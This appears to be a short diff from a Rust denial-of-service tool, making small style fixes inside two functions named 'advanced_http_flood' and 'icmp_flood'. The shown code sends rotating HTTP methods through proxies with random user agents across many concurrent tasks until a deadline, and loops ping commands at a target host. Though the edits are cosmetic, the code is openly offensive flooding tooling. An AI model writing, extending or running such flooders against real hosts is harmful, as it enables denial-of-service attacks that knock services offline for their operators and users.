@@ -150,7 +150,7 @@ pub async fn advanced_http_flood(
 ) -> u64 {
     let client = build_http_client(proxy, 3, &random_user_agent());
     let semaphore = Arc::new(Semaphore::new(threads));
-    let methods = vec!["GET", "POST", "HEAD", "PUT", "DELETE"];
+    let methods = ["GET", "POST", "HEAD", "PUT", "DELETE"];
     let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
     let mut tasks = vec![];
     let mut request_count = 0u64;
@@ -190,7 +190,7 @@ pub async fn icmp_flood(target: &str, threads: usize, duration_secs: u64) -> u64
         tasks.push(tokio::spawn(async move {
             while tokio::time::Instant::now() < end {
                 let _ = Command::new("ping")
-                    .args(&["-n", "1", "-w", "100", &host])
+                    .args(["-n", "1", "-w", "100", &host])
                     .output();
             }
         }));
